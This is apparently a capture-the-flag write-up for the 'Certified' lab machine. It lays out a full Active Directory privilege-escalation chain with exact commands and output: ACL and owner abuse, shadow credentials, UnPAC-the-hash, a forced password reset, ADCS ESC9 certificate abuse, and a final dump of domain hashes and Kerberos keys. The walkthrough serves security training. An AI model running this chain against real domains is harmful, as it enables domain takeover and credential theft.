As is common in real life Windows pentests, you will start the Certified box with credentials for the following account: judith.mader / judith09

## HOST RECON

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
```


#### Login as judith.mader not work, this user not be able to login via winrm


#### outside recon with bloodhound python script https://github.com/dirkjanm/BloodHound.py

```
└─$ bloodhound-python --zip -c All -d certified.htb -u judith.mader -p judith09 -ns 10.10.11.41
```

#### User judith.mader has WriteOwner perm on the Object of the Management group

```
└─$ impacket-owneredit -action write -new-owner 'judith.mader' -target 'Management' 'certified.htb'/'judith.mader':'judith09' -dc-ip 10.10.11.41
[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-1103
[*] - sAMAccountName: judith.mader
[*] - distinguishedName: CN=Judith Mader,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
```

```
└─$ impacket-dacledit -action write -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
[*] DACL backed up to dacledit-20241122-233953.bak
[*] DACL modified successfully!
```

```
└─$ net rpc group addmem "Management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41
```

#### verify if judith has added to group

```
└─$ net rpc group members "Management" -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41
CERTIFIED\judith.mader
CERTIFIED\management_svc
```

#### after adding the user judith.mader to the Management group...According to BloodHound data, users belonging to the Management group have GenericWrite permissions on the Management_svc service user.

#### Following the suggested attack path, we start with Shadow Credentials:

- https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials

```
└─$ python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add" --dc-ip 10.10.11.41
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: cedf9be9-509b-ddb0-81cd-a1c583174573
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: n0h9gcx3.pfx
[*] Must be used with password: HpCnX1ps8VL1X2asgP4v
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

#### The output of the pywhisker tool generates a .pfx certificate that can be used by the other tool suggested in the previous output. Thus making a Pass-the-Certificate.

- https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate

#### Following the poc from the pass-the-cert article, we use the gettgtpkinit.py tool (from the same repo) along with the pfx cert and temporary password provided by the previous tool...

#### I received an error about the server clock, I would probably have to synchronize my machine's clock with the AD server's, or use the faketime tool:

```
└─$ python3 gettgtpkinit.py certified.htb/management_svc -cert-pfx ../pywhisker/pywhisker/n0h9gcx3.pfx -pfx-pass 'HpCnX1ps8VL1X2asgP4v' man_svc.ccache

...

File "/usr/lib/python3/dist-packages/minikerberos/network/clientsoc ", line 85, in sendrecv
    raise KerberosError(krb_message)
minikerberos.protocol.errors.KerberosError:  Error Name: KRB_AP_ERR_SKEW Detail: "The clock skew is too great"
```

#### With faketime works.

```
└─$ faketime -f +7h python3 gettgtpkinit.py certified.htb/management_svc -cert-pfx ../pywhisker/pywhisker/n0h9gcx3.pfx -pfx-pass 'HpCnX1ps8VL1X2asgP4v' man_svc.ccache
2024-11-23 18:55:08,041 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2024-11-23 18:55:08,053 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2024-11-23 18:55:31,787 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2024-11-23 18:55:31,788 minikerberos INFO     7c43187068a25d13c99be0c4b67b2c0314935af960da70721e11d4f5538fb160
INFO:minikerberos:7c43187068a25d13c99be0c4b67b2c0314935af960da70721e11d4f5538fb160
2024-11-23 18:55:31,793 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

#### With the TGT_cache_file and the session key we use another tool from the same repo to get the NT-hash of the user management_svc (UnPAC-the-hash).

- https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash

```
└─$ export KRB5CCNAME=man_svc.ccache
```
```
└─$ faketime -f +7h python3 getnthash.py certified.htb/management_svc -key 7c43187068a25d13c99be0c4b67b2c0314935af960da70721e11d4f5538fb160 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584
```

## Login as management_svc

```
└─$ evil-winrm -i 10.10.11.41 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
```

#### Enum management_svc user

```
*Evil-WinRM* PS C:\Users\management_svc\Desktop> whoami /all

USER INFORMATION
----------------

User Name                SID
======================== =============================================
certified\management_svc S-1-5-21-729746778-2675978091-3820388244-1105


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                           Attributes
=========================================== ================ ============================================= ==================================================
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
CERTIFIED\Management                        Group            S-1-5-21-729746778-2675978091-3820388244-1104 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

```
*Evil-WinRM* PS C:\users\management_svc\Desktop> dsquery user
"CN=Administrator,CN=Users,DC=certified,DC=htb"
"CN=Guest,CN=Users,DC=certified,DC=htb"
"CN=krbtgt,CN=Users,DC=certified,DC=htb"
"CN=Judith Mader,CN=Users,DC=certified,DC=htb"
"CN=management service,CN=Users,DC=certified,DC=htb"
"CN=operator ca,CN=Users,DC=certified,DC=htb"
"CN=Alexander Huges,CN=Users,DC=certified,DC=htb"
"CN=Harry Wilson,CN=Users,DC=certified,DC=htb"
"CN=Gregory Cameron,CN=Users,DC=certified,DC=htb"
```

#### PowerView report this acl. User management_svc has GerericAll over operator ca (or ca_operator) user.

```
*Evil-WinRM* PS C:\users\management_svc\Desktop> find-interestingdomainacl | ?{$_.identityreferencename -match "management_svc"}


ObjectDN                : CN=operator ca,CN=Users,DC=certified,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : ContainerInherit
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-729746778-2675978091-3820388244-1105
IdentityReferenceName   : management_svc
IdentityReferenceDomain : certified.htb
IdentityReferenceDN     : CN=management service,CN=Users,DC=certified,DC=htb
IdentityReferenceClass  : user
```

#### NOTA: Não tinha nada, não achei nada na maquina do user man_svc (guessiiiiiinnnnng!!!!!!) Ai como o htb tem essa putaria de dar dicas pelo nome da maquina ou pelo icone da maquina, então...

#### No vulnerable certificates for management_svc... 

```
*Evil-WinRM* PS C:\users\management_svc\Desktop> .\Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=certified,DC=htb'

[*] Listing info about the Enterprise CA 'certified-DC01-CA'

    Enterprise CA Name            : certified-DC01-CA
    DNS Hostname                  : DC01.certified.htb
    FullName                      : DC01.certified.htb\certified-DC01-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=certified-DC01-CA, DC=certified, DC=htb
    Cert Thumbprint               : 6E732CD94E1A4E13F9263FB33DF4D99F7B13B718
    Cert Serial                   : 36472F2C180FBB9B4983AD4D60CD5A9D
    Cert Start Date               : 5/13/2024 8:33:41 AM
    Cert End Date                 : 5/13/2124 8:43:41 AM
    Cert Chain                    : CN=certified-DC01-CA,DC=certified,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               CERTIFIED\Domain Admins       S-1-5-21-729746778-2675978091-3820388244-512
      Allow  ManageCA, ManageCertificates               CERTIFIED\Enterprise Admins   S-1-5-21-729746778-2675978091-3820388244-519
    Enrollment Agent Restrictions : None

[+] No Vulnerable Certificates Templates found!
```

#### I try use Force Change Password with PowerView but not working, i dont know why... Later i try with linux method and works as well.

```
└─$ pth-net rpc password "ca_operator" "newP@ssword2022" -U "certified.htb"/"management_svc"%"a091c1832bcdd4677c28b5a6a1295584":"a091c1832bcdd4677c28b5a6a1295584" -S 10.10.11.41
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
```

#### Checking if new pass is valid

```
└─$ crackmapexec smb 10.10.11.41 -u 'ca_operator' -p 'newP@ssword2022' --continue-on-success
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\ca_operator:newP@ssword2022 
```

#### finding vulnerable certificates for ca_operator user outside of the machine:

```
└─$ certipy find -username ca_operator@certified.htb -password 'newP@ssword2022' -dc-ip 10.10.11.41
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'certified-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'certified-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'certified-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'certified-DC01-CA'
[*] Saved BloodHound data to '20241124145208_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20241124145208_Certipy.txt'
[*] Saved JSON output to '20241124145208_Certipy.json'
```

#### Here we see the vulnerable certificate related with ca_operator user. Certipy output give us even which missconfig was to be explored ESC9:

```
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectAltRequireUpn
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Property Principals       : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
    [!] Vulnerabilities
      ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension
```

refs:

- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#id-5485
- https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension
- https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7


#### Lets explore this

```
└─$ certipy account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

```
└─$ certipy req -username ca_operator@certified.htb -password 'newP@ssword2022' -ca certified-DC01-CA -template CertifiedAuthentication
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 15
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

```
└─$ certipy account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```

```
└─$ faketime -f +7h certipy auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.10.11.41 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

## Login as Administrator

```
└─$ evil-winrm -i 10.10.11.41 -u administrator -H 0d5b49608bbce1751f708748f67e2d34
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami /all

USER INFORMATION
----------------

User Name               SID
======================= ============================================
certified\administrator S-1-5-21-729746778-2675978091-3820388244-500


GROUP INFORMATION
-----------------

Group Name                                       Type             SID                                          Attributes
================================================ ================ ============================================ ===============================================================
Everyone                                         Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                           Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                    Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access       Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access          Alias            S-1-5-32-574                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                             Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                 Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                   Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
CERTIFIED\Group Policy Creator Owners            Group            S-1-5-21-729746778-2675978091-3820388244-520 Mandatory group, Enabled by default, Enabled group
CERTIFIED\Domain Admins                          Group            S-1-5-21-729746778-2675978091-3820388244-512 Mandatory group, Enabled by default, Enabled group
CERTIFIED\Enterprise Admins                      Group            S-1-5-21-729746778-2675978091-3820388244-519 Mandatory group, Enabled by default, Enabled group
CERTIFIED\Schema Admins                          Group            S-1-5-21-729746778-2675978091-3820388244-518 Mandatory group, Enabled by default, Enabled group
CERTIFIED\Denied RODC Password Replication Group Alias            S-1-5-21-729746778-2675978091-3820388244-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                 Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level             Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

```
└─$ impacket-secretsdump certified.htb/administrator@10.10.11.41 -hashes 0d5b49608bbce1751f708748f67e2d34:0d5b49608bbce1751f708748f67e2d34
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xdc429b6cbafdcc74c2c3524c029f3844
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
CERTIFIED\DC01$:aes256-cts-hmac-sha1-96:9d7b5d3f2a19dbc9ba1fdc30868f6785fa1ed4af4f926c15f2582d0e62c1fa8b
CERTIFIED\DC01$:aes128-cts-hmac-sha1-96:d847be4c23d527272a37955bfd62ecce
CERTIFIED\DC01$:des-cbc-md5:7cf78f2373fd5dad
CERTIFIED\DC01$:plain_password_hex:eddff1eaf0fdece3db4133706a6ad89c44fae7062134287efdbe14fd60166c686fe91ba3c58187a690ff9416c6399bd5da46ca4b6b6d032ca6c42fbd6a1943de5a17bd9aa5faf7c630c591c46fc52a10c2366eb471705dbd0686658655928d2161a7f799e2cb5834a15cbb48943f4fcad34cded52281a6f6f466bfbc0a386a52fca1e7549ea7aebf01f7de588bec0d4b697ede0092115f2cbe99b7e8c44ddd1715dd1243b445cbe3a66133c2dd8bf93205c414ed4dc647289f40dbee0f20101e154193bae7a66edb07c916eb095016f17cfcd230a9eca7956e2343fed987dd71aacdee9a2091e0d4b7b72e5644c2ec61
CERTIFIED\DC01$:aad3b435b51404eeaad3b435b51404ee:8f3cbea3908ffcde111e6a077c37dac4:::
[*] DefaultPassword 
CERTIFIED\Administrator:sh4rQoa0USkwJBLV
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xdc8ad5f7ad02952a1da8dc406fba14a7b2b04ee9
dpapi_userkey:0x9ded1f864954f0636a865202e9e8859e86a9d3d3
[*] NL$KM 
 0000   FF 36 C4 27 B9 DA AB 16  D7 A0 D6 91 B1 59 33 8C   .6.'.........Y3.
 0010   89 9E C8 F9 83 A9 BE 38  52 92 CD C2 FE AD 09 4C   .......8R......L
 0020   08 30 14 DD E1 59 50 8A  E3 A8 2E 29 39 EE 09 67   .0...YP....)9..g
 0030   2E EA FB 17 5C 49 95 D0  61 A2 BC 79 3F E8 BD 7A   ....\I..a..y?..z
NL$KM:ff36c427b9daab16d7a0d691b159338c899ec8f983a9be385292cdc2fead094c083014dde159508ae3a82e2939ee09672eeafb175c4995d061a2bc793fe8bd7a
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:41c6e6d9e7fe3f175b42df14a3815969:::
certified.htb\judith.mader:1103:aad3b435b51404eeaad3b435b51404ee:8ec62ac86259004c121a7df4243a7a80:::
certified.htb\management_svc:1105:aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584:::
certified.htb\ca_operator:1106:aad3b435b51404eeaad3b435b51404ee:fb54d1c05e301e024800c6ad99fe9b45:::
certified.htb\alexander.huges:1601:aad3b435b51404eeaad3b435b51404ee:cde915082011eef6f107ab4384124983:::
certified.htb\harry.wilson:1602:aad3b435b51404eeaad3b435b51404ee:37a50354c4a799ace944d130ed34cd03:::
certified.htb\gregory.cameron:1603:aad3b435b51404eeaad3b435b51404ee:b7ef92685ee618fc477f6b7668a829af:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:8f3cbea3908ffcde111e6a077c37dac4:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:a1b09c0f0c3493f972e1714b7fc75101f4bc99c992abacfd0a52dcc5b24e8b0b
Administrator:aes128-cts-hmac-sha1-96:46a9275f14507c895618a25064c2bd07
Administrator:des-cbc-md5:f85bb3df31f404f2
krbtgt:aes256-cts-hmac-sha1-96:cb9001c5adc47b87a45b7eaf0e9cdd207a8fe7224007fde96bb55ee9063c5b89
krbtgt:aes128-cts-hmac-sha1-96:a568f881530c994b3c2afbb3377f54e0
krbtgt:des-cbc-md5:6ecd515e206d38b3
certified.htb\judith.mader:aes256-cts-hmac-sha1-96:d438bb37e044bb971cc2663c8a21b92de2744d759a4e2d330f095ae3fe28fbd0
certified.htb\judith.mader:aes128-cts-hmac-sha1-96:78206ca437421fd19a485cb795f9dab8
certified.htb\judith.mader:des-cbc-md5:bf853e7a4f75ce62
certified.htb\management_svc:aes256-cts-hmac-sha1-96:541fdfb38b55cddd6e5ae67a5d284dfcf0cb8b817b73982c2e67b2f4382f5274
certified.htb\management_svc:aes128-cts-hmac-sha1-96:11d5a39a6639789a63db3d00882162a6
certified.htb\management_svc:des-cbc-md5:8a9bc7513e7f6be5
certified.htb\ca_operator:aes256-cts-hmac-sha1-96:14d36b4447ff8536f455bc33b064d04d661651e8394d486ab5a1ad2cea708c41
certified.htb\ca_operator:aes128-cts-hmac-sha1-96:943b9c8381a5a54269542ccb440555c0
certified.htb\ca_operator:des-cbc-md5:85d93b7c348ab9cd
certified.htb\alexander.huges:aes256-cts-hmac-sha1-96:0ff4b5450d4038b588cc821a29e46c476f5aa50a87c74141e167144d4ba5a954
certified.htb\alexander.huges:aes128-cts-hmac-sha1-96:9ee7f9d4b7e86477491721739a1ce3ff
certified.htb\alexander.huges:des-cbc-md5:b35861e05bd0f23b
certified.htb\harry.wilson:aes256-cts-hmac-sha1-96:d91236c4cb5e7297f990a432ddedf3721751d357a4af24dcd7fd840089ba2c27
certified.htb\harry.wilson:aes128-cts-hmac-sha1-96:4f3024e9749a2f429db5e53715d82c32
certified.htb\harry.wilson:des-cbc-md5:e9ce5704da404f7f
certified.htb\gregory.cameron:aes256-cts-hmac-sha1-96:cdedeab400a4166c167b8dd773d02f34fea669c3fa07984e9097c956f00e1092
certified.htb\gregory.cameron:aes128-cts-hmac-sha1-96:4e80c8699fcd90e5f074768a4650486a
certified.htb\gregory.cameron:des-cbc-md5:9b678079089bec1a
DC01$:aes256-cts-hmac-sha1-96:9d7b5d3f2a19dbc9ba1fdc30868f6785fa1ed4af4f926c15f2582d0e62c1fa8b
DC01$:aes128-cts-hmac-sha1-96:d847be4c23d527272a37955bfd62ecce
DC01$:des-cbc-md5:25fe020b0bdf2fbc
```

